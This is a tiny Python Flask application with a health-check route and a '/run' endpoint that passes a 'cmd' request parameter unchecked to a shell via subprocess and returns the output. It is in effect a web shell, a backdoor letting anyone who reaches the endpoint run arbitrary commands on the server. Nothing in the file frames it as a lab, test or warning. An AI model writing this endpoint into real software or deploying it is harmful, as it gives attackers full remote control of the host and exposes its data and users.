import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/status')
def healthcheck():
    return 'OK'

@app.route('/run', methods=['GET'])
def run():
    cmd = request.values.get('cmd')
    return subprocess.check_output(cmd, shell=True, text=True)
